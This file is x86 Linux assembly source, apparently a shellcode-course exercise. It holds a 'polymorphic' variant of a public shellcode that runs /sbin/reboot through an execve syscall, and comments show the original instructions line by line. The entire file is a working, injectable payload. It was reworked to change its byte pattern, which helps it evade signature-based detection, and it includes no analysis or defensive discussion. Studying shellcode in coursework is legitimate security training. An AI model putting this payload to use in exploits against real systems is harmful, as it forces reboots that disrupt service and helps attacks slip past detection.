; Filename    : reboot.asm
; Author      : Joris Hartog
; Date        : 07-12-2015
; Student     : SLAE-704
; Size        : 42 bytes
; Description : This program is a polymorphic version of a
;  shellcode that reboots the system, which can be found at:
;   http://shell-storm.org/shellcode/files/shellcode-69.php
;  The size of the original shellcode is 30 bytes, this 
;  version is 42 bytes.

global _start

section .text

_start:

	xor esi, esi		;	xor eax, eax
	push esi		;	push eax
	sub esp, 2		;	push 0x746f6f62
	mov word [esp], 0x746f	;	push 0x65722f6e
	push 0x6f626572		;	push 0x6962732f
	push 0x2f6e6962		;
	push word 0x732f	; 
	mov ebx, esp		;	mov ebx, esp
	mov edx, esp		;	push eax
	sub edx, 4		;
	push esi		;	mov edx, esp
	push ebx		;	push ebx
	mov ecx, esp		;	mov ecx, esp
	push byte 0xb		;	mov al, 0xb
	pop eax			;
	int 0x80		;	int 0x80
